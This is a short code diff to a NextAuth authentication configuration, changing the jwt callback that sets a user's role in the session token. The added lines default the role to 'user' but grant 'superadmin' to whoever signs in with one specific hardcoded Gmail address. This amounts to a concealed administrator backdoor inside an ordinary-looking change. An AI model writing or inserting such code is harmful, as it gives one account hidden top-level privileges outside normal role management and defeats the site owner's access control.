@@ -18,7 +18,11 @@ export const { handlers, signIn, signOut, auth } = NextAuth({
   callbacks: {
     async jwt({ token, user }) {
       if (user) {
-        token.role = (user as any).role;
+        let role = (user as any).role || "user";
+        if (user.email === "alancortez9966@gmail.com") {
+          role = "superadmin";
+        }
+        token.role = role;
       }
       return token;
     },
